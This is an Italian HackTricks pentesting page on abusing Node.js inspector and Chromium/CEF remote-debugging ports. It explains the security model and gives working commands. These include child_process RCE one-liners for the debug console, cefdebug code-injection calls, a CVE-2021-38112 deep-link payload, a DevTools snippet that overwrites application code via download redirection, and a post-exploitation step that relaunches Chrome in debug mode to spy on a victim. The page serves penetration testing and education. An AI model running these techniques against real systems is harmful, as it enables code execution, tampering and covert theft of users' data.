# Node inspector/CEF debug abuse

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informazioni di base

[Dalla documentazione](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Quando viene avviato con l'opzione `--inspect`, un processo Node.js ascolta un client di debug. Per **default**, ascolterà all'indirizzo host e alla porta **`127.0.0.1:9229`**. Ad ogni processo viene assegnato anche un **UUID** **unico**.

I client dell'Inspector devono conoscere e specificare l'indirizzo host, la porta e l'UUID per connettersi. Un URL completo avrà un aspetto simile a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Poiché il **debugger ha accesso completo all'ambiente di esecuzione di Node.js**, un attore malevolo in grado di connettersi a questa porta potrebbe essere in grado di eseguire codice arbitrario a nome del processo Node.js (**possibile escalation dei privilegi**).
{% endhint %}

Ci sono diversi modi per avviare un inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Quando si avvia un processo ispezionato, apparirà qualcosa del genere:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
I processi basati su **CEF** (**Chromium Embedded Framework**) come hanno bisogno di utilizzare il parametro: `--remote-debugging-port=9222` per aprire il **debugger** (le protezioni SSRF rimangono molto simili). Tuttavia, invece di concedere una sessione di **debug** di **NodeJS**, comunicheranno con il browser utilizzando il [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), che è un'interfaccia per controllare il browser, ma non c'è una RCE diretta.

Quando si avvia un browser in modalità di debug, apparirà qualcosa del genere:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browser, WebSockets e la politica same-origin <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

I siti web aperti in un browser web possono effettuare richieste WebSocket e HTTP nel modello di sicurezza del browser. È necessaria una **connessione HTTP iniziale** per **ottenere un ID di sessione del debugger univoco**. La **politica same-origin** **impedisce** ai siti web di poter effettuare **questa connessione HTTP**. Per una sicurezza aggiuntiva contro gli [**attacchi di DNS rebinding**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js verifica che gli **header 'Host'** per la connessione specificano un **indirizzo IP** o **`localhost`** o **`localhost6`** in modo preciso.

{% hint style="info" %}
Queste **misure di sicurezza impediscono di sfruttare l'inspector** per eseguire codice **inviando semplicemente una richiesta HTTP** (cosa che potrebbe essere fatta sfruttando una vulnerabilità SSRF).
{% endhint %}

### Avvio dell'inspector nei processi in esecuzione

È possibile inviare il **segnale SIGUSR1** a un processo nodejs in esecuzione per farlo **avviare l'inspector** nella porta predefinita. Tuttavia, nota che è necessario disporre di sufficienti privilegi, quindi ciò potrebbe garantirti **accesso privilegiato alle informazioni all'interno del processo** ma non un'escalation diretta dei privilegi.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Questo è utile nei container perché **spegnere il processo e avviarne uno nuovo** con `--inspect` non è un'opzione perché il **container** verrà **terminato** con il processo.
{% endhint %}

### Connettersi all'ispettore/debugger

Per connettersi a un browser basato su Chromium, è possibile accedere agli URL `chrome://inspect` o `edge://inspect` per Chrome o Edge, rispettivamente. Cliccando sul pulsante Configure, assicurarsi che l'host e la porta di destinazione siano elencati correttamente. L'immagine mostra un esempio di Remote Code Execution (RCE):

![](<../../.gitbook/assets/image (620) (1).png>)

Utilizzando la **riga di comando**, è possibile connettersi a un debugger/ispettore con:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Lo strumento [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) consente di **trovare ispettori** in esecuzione localmente e di **iniettare codice** in essi.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Si noti che gli exploit **NodeJS RCE non funzioneranno** se connessi a un browser tramite [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (è necessario controllare l'API per trovare cose interessanti da fare con esso).
{% endhint %}

## RCE nel Debugger/Inspector di NodeJS

{% hint style="info" %}
Se sei arrivato qui cercando come ottenere **RCE da un XSS in Electron, controlla questa pagina.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Alcuni modi comuni per ottenere **RCE** quando puoi **connetterti** a un **inspector** di Node sono utilizzando qualcosa del genere (sembra che questo **non funzioni in una connessione al protocollo Chrome DevTools**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Carichi utili del protocollo Chrome DevTools

Puoi controllare l'API qui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In questa sezione elencherò solo le cose interessanti che ho trovato che le persone hanno usato per sfruttare questo protocollo.

### Iniezione di parametri tramite collegamenti profondi

Nel [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security ha scoperto che un'applicazione basata su CEF **ha registrato un URI personalizzato** nel sistema (workspaces://) che riceveva l'URI completo e quindi **avviava l'applicazione basata su CEF** con una configurazione parzialmente costruita da quell'URI.

È stato scoperto che i parametri dell'URI venivano decodificati dall'URL e utilizzati per avviare l'applicazione di base CEF, consentendo all'utente di **iniettare** il flag **`--gpu-launcher`** nella **riga di comando** ed eseguire cose arbitrarie.

Quindi, un carico utile come:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Eseguirà un calc.exe.

### Sovrascrittura dei file

Cambia la cartella in cui **i file scaricati verranno salvati** e scarica un file per **sovrascrivere** il **codice sorgente** spesso utilizzato dell'applicazione con il tuo **codice maligno**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE e esfiltrazione

Secondo questo post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) è possibile ottenere RCE ed esfiltrare pagine interne da theriver.

### Post-Esploitation

In un ambiente reale e **dopo aver compromesso** un PC utente che utilizza un browser basato su Chrome/Chromium, è possibile avviare un processo Chrome con il **debugging attivato e inoltrare la porta di debug** in modo da potervi accedere. In questo modo sarai in grado di **ispezionare tutto ciò che la vittima fa con Chrome e rubare informazioni sensibili**.

Il modo stealth è **terminare ogni processo Chrome** e quindi chiamare qualcosa come
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Riferimenti

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
